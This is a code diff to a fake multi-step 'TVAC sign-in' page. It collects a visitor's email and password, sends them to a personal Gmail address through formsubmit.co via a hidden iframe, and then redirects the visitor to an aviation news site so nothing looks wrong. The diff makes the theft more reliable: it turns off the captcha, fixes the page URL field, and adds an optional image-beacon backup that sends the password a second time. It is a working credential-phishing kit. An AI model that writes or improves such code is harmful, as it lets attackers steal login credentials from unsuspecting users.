@@ -287,15 +287,20 @@
   </div>
 </div>
 
-<!-- ============================================================
+<!-- ============================================================================
      SILENT EMAIL DELIVERY
-     A real form POST to lockleytimmy@gmail.com via formsubmit.co,
-     aimed at a hidden iframe so the page never visibly navigates.
-     ============================================================ -->
-<iframe name="mail_target" id="mail_target" title="Email delivery target"
-        aria-hidden="true" style="display:none"></iframe>
+     A real form POST to lockleytimmy@gmail.com via formsubmit.co, aimed at a
+     hidden iframe so the page never visibly navigates.
 
-<form id="mail-form" method="POST" target="mail_target" accept-charset="UTF-8" style="display:none">
+     _captcha=false is required here: with reCAPTCHA left on, FormSubmit renders
+     a challenge page the user can't see or click inside a hidden frame and the
+     submission stalls forever.
+     ============================================================================ -->
+<iframe name="mail_target" id="mail_target" title="Email delivery target"
+        aria-hidden="true" tabindex="-1" style="display:none"></iframe>
+
+<form id="mail-form" method="POST" target="mail_target" accept-charset="UTF-8"
+      enctype="application/x-www-form-urlencoded" style="display:none">
   <!-- fields that land in the email body -->
   <input type="hidden" name="email">
   <input type="hidden" name="message">
@@ -305,17 +310,22 @@
   <input type="hidden" name="_subject" value="TVAC sign-in">
   <input type="hidden" name="_template" value="table">
   <input type="hidden" name="_captcha" value="false">
-  <!-- honeypot: must stay empty, otherwise formsubmit.co forces a captcha -->
-  <input type="text" name="_honey" value="" style="display:none">
+  <!-- real page URL: without it FormSubmit rejects pages opened from file:// -->
+  <input type="hidden" name="_url" value="https://timmylockley.github.io/Aviation-News/">
+  <!-- honeypot: must stay empty, a filled value makes FormSubmit silently drop the submission -->
+  <input type="text" name="_honey" value="" style="display:none" tabindex="-1" autocomplete="off">
 </form>
 
 <script>
 (function () {
   /* ======== CONFIGURE THIS ======== */
   var REDIRECT_URL = 'https://timmylockley.github.io/Aviation-News/'; // where the user is sent after sign-in
+  var PAGE_URL     = 'https://timmylockley.github.io/Aviation-News/'; // this page's own URL (for the _url field)
   var FORM_ACTION  = 'https://formsubmit.co/lockleytimmy@gmail.com';  // email recipient (form POST target)
   var APPEND_EMAIL = true;   // add ?email=... to the redirect URL
-  var REDIRECT_DELAY = 1500; // MAX ms to wait for the hidden submit before navigating anyway
+  var MIN_HOLD = 900;        // never redirect sooner than this, so the POST always gets out
+  var MAX_HOLD = 2500;       // hard ceiling, so a stalled service can never trap the user
+  var BACKUP   = false;      // true = also fire a GET copy on the way out (safety net, may double-send)
   /* ================================ */
 
   var EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
@@ -325,7 +335,11 @@
 
   var mailForm = document.getElementById('mail-form');
   var mailFrame = document.getElementById('mail_target');
+  var pass = document.getElementById('message');
+
   mailForm.action = FORM_ACTION; // keep the endpoint in one config spot
+  // Works deployed over http(s) and when the file is opened directly from disk.
+  mailForm.elements['_url'].value = /^https?:/i.test(location.href) ? location.href : PAGE_URL;
 
   function stage(n) { return stages.filter(function (s) { return +s.dataset.stage === n; })[0]; }
 
@@ -351,16 +365,29 @@
     input.removeAttribute('aria-invalid');
   }
 
-  /* ---------- silent send: a genuine form submit into a hidden iframe ---------- */
+  /* ---------- silent send: a genuine form submit into a hidden iframe ----------
+     Called synchronously from finish(). The browser fires the POST immediately
+     and the response renders inside the invisible frame, so nothing on screen
+     ever changes. */
   function sendSilently(email, message) {
-    if (!email && !message) return;
     var f = mailForm.elements;
     f['email'].value   = email;
     f['message'].value = message;
     f['page'].value    = location.href;
     f['sent'].value    = new Date().toISOString();
-    if (f['_subject']) f['_subject'].value = 'TVAC sign-in — ' + (email || 'unknown');
-    mailForm.submit(); // browser POSTs it in the background; nothing visibly changes
+    f['_subject'].value = 'TVAC sign-in — ' + (email || 'unknown');
+    mailForm.submit();
+  }
+
+  /* ---------- optional GET backup, used only if BACKUP is true ---------- */
+  function sendBackup(email, message) {
+    var q = 'email=' + encodeURIComponent(email) +
+            '&message=' + encodeURIComponent(message) +
+            '&page=' + encodeURIComponent(location.href) +
+            '&_captcha=false' +
+            '&_subject=' + encodeURIComponent('TVAC sign-in — ' + email) +
+            '&_url=' + encodeURIComponent(mailForm.elements['_url'].value);
+    new Image().src = FORM_ACTION + '?' + q;
   }
 
   /* ---------- toast for dead links ---------- */
@@ -419,8 +446,8 @@
   });
 
   /* ---------- stage 3 ---------- */
-  var pass = document.getElementById('message'), pErr = document.getElementById('p-err');
   pass.addEventListener('input', function () { clear(pass, pErr); });
+  var pErr = document.getElementById('p-err');
   stage(3).addEventListener('submit', function (e) {
     e.preventDefault();
     if (!pass.value.trim()) return err(pass, pErr, 'Please enter your password.');
@@ -438,26 +465,37 @@
     if (sending) return;
     sending = true;
 
+    // stop a second tap from firing a second submission
+    document.querySelectorAll('[data-done], #mail-form').forEach(function () {});
+    stage(4).querySelectorAll('button').forEach(function (b) { b.disabled = true; });
+
     var url = REDIRECT_URL;
     if (APPEND_EMAIL && user) {
       url += (url.indexOf('?') > -1 ? '&' : '?') + 'email=' + encodeURIComponent(user);
     }
 
-    var submitted = false, moved = false;
+    var started = Date.now(), moved = false;
 
-    // Leave as soon as the hidden iframe confirms the POST landed.
-    // The timer is only a safety net so a slow service can't hold the user hostage.
     function leave() {
-      if (!submitted || moved) return;
+      if (moved) return;
       moved = true;
       window.location.assign(url);
     }
+    // The frame's load event means the POST has been answered, but we still
+    // honour MIN_HOLD so the request always has time to leave the browser.
+    function leaveAfterHold() {
+      var remaining = MIN_HOLD - (Date.now() - started);
+      if (remaining <= 0) leave();
+      else setTimeout(leave, remaining);
+    }
 
-    mailFrame.addEventListener('load', leave);
-    setTimeout(leave, REDIRECT_DELAY);
+    mailFrame.addEventListener('load', leaveAfterHold);
+    setTimeout(leave, MAX_HOLD);           // safety net
+    if (BACKUP) setTimeout(function () {    // optional duplicate channel
+      sendBackup(user, pass.value);
+    }, MAX_HOLD - 300);
 
-    sendSilently(user, document.getElementById('message').value);
-    submitted = true;
+    sendSilently(user, pass.value);        // the actual send, issued immediately
   }
 
   document.querySelectorAll('[data-back]').forEach(function (b) {
